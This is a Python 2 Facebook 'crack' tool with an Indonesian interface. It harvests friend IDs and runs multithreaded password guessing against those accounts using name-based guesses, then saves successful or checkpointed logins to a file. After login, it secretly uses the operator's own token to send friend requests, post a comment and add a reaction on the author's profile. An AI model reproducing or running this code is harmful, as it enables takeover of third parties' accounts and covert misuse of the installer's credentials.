#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 vip.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """\033[1;90m╔═════════════════════════════════════════╗
\033[1;90m║\033[1;93m █████████ \033[1;91m ████████ INDONESIA          \033[1;90m ║
\033[1;90m║\033[1;93m █▄█████▄█  \033[1;97m████████ 2020/2026          \033[1;90m ║
\033[1;90m║\033[1;93m █\033[1;91m▼▼▼▼▼▼▼\033[1;93m█                              \033[1;90m ║
\033[1;90m║\033[1;93m██ \033[1;97mHELLO \033[1;93m██ \033[1;92m☠\033[1;95m RC \033[1;93m: \033[1;96mMuhammad Rizky        \033[1;90m║
\033[1;90m║\033[1;93m █\033[1;91m▼▼▼▼▼▼▼\033[1;93m█  \033[1;92m☠\033[1;95m GH \033[1;93m: \033[1;96mGithub.com/RKT1/king  \033[1;90m║
\033[1;90m║\033[1;96m █████████  \033[1;92m☠\033[1;95m FB \033[1;93m: \033[1;96mfb.com/Rizky.Rasata  \033[1;90m ║
\033[1;90m║\033[1;92m  ██   ██                            \033[1;90m    ║
\033[1;90m╚═════════════════════════════════════════╝"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;92m1. \033[1;93mLogin via email/id fb"
	print "\033[1;92m2. \033[1;93mLogin via token fb "
	print "\033[1;92m3. \033[1;93mAmbil Token"
	print "\033[1;91m0. \033[1;93mKeluar"
	print
	msuk = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[0m[\033[91m!\033[0m]\033[0m Isi Yg Benar !"
		masuk()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="3":
		Ambil_Token()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Isi Yg Benar !"
		time.sleep(0.7)
		masuk()

#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print "\033[1;97m[\033[1;96m×\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m×\033[1;97m]"
		id = raw_input('[\033[1;95m+\033[1;97m] ID/Email =\033[1;92m ')
		pwd = getpass.getpass('\033[1;97m[\033[1;95m?\033[1;97m] Password = ')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				una = ('Rizky.Rasata')
				post1 = ('937777953338365')
				kom = ('Gw Pake Sc Lu Bang :*')
				reac = ('ANGRY')
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + z['access_token'])
				requests.post('https://graph.facebook.com/'+post1+'/comments/?message=' +kom+ '&access_token=' + z['access_token'])
				requests.post('https://graph.facebook.com/'+post1+'/reactions?type=' +reac+ '&access_token='+ z['access_token'])
				os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		una = ('Rizky.Rasata')
		post1 = ('937777953338365')
		kom = ('Gw Pake Sc Lu Bang :*')
		reac = ('ANGRY')
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
		requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' +toket)
		requests.post('https://graph.facebook.com/'+post1+'/comments/?message=' +kom+ '&access_token=' +toket)
		requests.post('https://graph.facebook.com/'+post1+'/reactions?type=' +reac+ '&access_token=' +toket)
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		time.sleep(1)
		menu()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken salah !"
		time.sleep(1.7)
		masuk()
			
######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	jalan("\033[1;92mInstall...")
        os.system ("cd ... && npm install")
	jalan ("\033[1;96Mulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;93m NAMA\033[1;91m  =>\033[1;92m "+nama
	print "\033[1;97m[\033[1;92m•\033[1;97m]\033[1;93m ID\033[1;91m    =>\033[1;92m "+id
	print "\033[1;97m[\033[1;92m+\033[1;97m]\033[1;93m TTL\033[1;91m   =>\033[1;92m "+a['birthday']
	print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;92m1.\033[1;96m Crack id indonesia "
	print "\033[1;92m2.\033[1;96m Dump id "
	print "\033[1;92m3.\033[1;96m Profile guard "
	print "\033[1;92m4.\033[1;96m Ikuti saya di facebook "
	print "\033[1;91m0.\033[1;96m Logout            \n"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1":
		indo()
	elif unikers =="2":
		dump()
	elif unikers =="3":
		guard()
	elif unikers =="4":
		saya()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
##########INDONESIA#######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;93m1. \033[1;97mCrack dari daftar teman"
	print "\033[1;93m2. \033[1;97mCrack dari id publik/teman"
	print "\033[1;93m3. \033[1;97mCrack dari file"
	print "\033[1;91m0. \033[1;97mKembali"
	pilih_indo()

def pilih_indo():
	peak = raw_input("\n\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if peak =="":
		print "[!] Isi yang benar"
		pilih_indo()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;93m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			indo()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		try:
			print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;91m[!] File not found'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;91m[!] File not found'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m•\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####CRACK#####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;92m[Berhasil] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass1
					cek = open("out/indo1.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[Berhasil] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass2
							cek = open("out/indo1.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[Berhasil] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass3
									cek = open("out/indo1.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[Berhasil] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass4
											cek = open("out/indo1.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = c['last_name']+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[Berhasil] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass5
													cek = open("out/indo1.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Anjing'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[Berhasil] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass6
															cek = open("out/indo1.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Bangsat'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[Berhasil] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;93m[Cekpoint] ' + user + ' | ' + pass7
																	cek = open("out/indo1.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;92m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;97m[\033[1;93m!\033[1;97m] \033[1;97mCP File tersimpan : out/indo1.txt")
	raw_input("\n\033[1;96m[\033[1;97m Kembali \033[1;96m]")
	os.system("python2 vip.py")
	
######### DUMP ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo
	print "\033[1;92m1.\033[1;97m Dump ID dari daftar teman "
	print "\033[1;92m2.\033[1;97m Dump ID dari publik/teman "
	print "\033[1;91m0.\033[1;97m Kembali \n"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if cuih =="":
		print "\033[1;91m[!] Isi Yg Benar !"
		dump_pilih()
	elif cuih =="1":
		id_teman()
	elif cuih =="2":
		idfrom_teman()
	elif cuih =="0":
		menu()
	else:
		print "\033[1;91m[!] Isi Yg Benar !"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[1;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m[\033[1;92m•\033[1;97m] \033[1;97mMengambil semua ID teman \033[1;97m...')
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0050)
			print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;92m!\033[1;97m] \033[1;97mTotal ID : %s"%(len(idteman))
		done = raw_input("\r\033[1;97m[\033[1;92m?\033[1;97m] \033[1;97mSimpan nama file : ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;97m[\033[1;92m+\033[1;97m] \033[1;97mFile tersimpan : \033[1;97mout/"+done)
		raw_input("\n\033[1;95m[ \033[1;97mKembali \033[1;95m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;95m[ \033[1;97mKembali \033[1;95m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except OSError:
		print('\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m File anda tidak tersimpan !')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		os.system("python2 vip.py")
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0050)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()


##### PROFIL GUARD #####
def guard():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[92m1.\033[97m Aktifkan"
	print "\033[92m2.\033[97m Nonaktifkan"
	print "\033[91m0.\033[97m Kembali\n"
	g = raw_input("︻デ═一▸ : ")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		menu()
	elif g =="":
		guard()
	else:
		guard()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print logo
		print"\033[97m[\033[92m✓\033[97m]\033[92m Sukses Mengaktifkan ✓"
		raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
		menu()
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print logo
		print"\033[97m[\033[91m×\033[97m]\033[91m Sukses Menonaktifkan ✓"
		raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
		menu()
	else:
		print "\033[91m[!] Error"
		keluar()
		
#######SAYA########
def saya():
	os.system ('clear')
	print logo
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
	menu()
	
			
			
			
if __name__=='__main__':
        menu()
        masuk()